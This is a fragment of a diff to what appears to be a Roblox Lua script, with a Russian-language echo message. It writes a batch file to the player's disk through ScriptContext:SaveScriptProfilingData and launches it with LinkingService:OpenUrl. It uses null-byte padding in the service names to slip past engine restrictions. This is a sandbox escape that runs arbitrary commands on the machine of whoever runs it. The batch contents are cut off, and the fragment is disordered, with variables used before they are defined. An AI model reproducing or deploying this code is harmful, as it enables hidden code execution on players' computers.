@@ -13,7 +13,7 @@ echo Файл batchUpdate.bat успешно сохранен в папку "Д�
 
 local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
 LinkingService:OpenUrl(payload)
-task.wait(2)
+task.wait(5)
 local LinkingService = game:GetService("LinkingService\0 meow meow meow")
 local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
 local scriptContent = [[@echo off
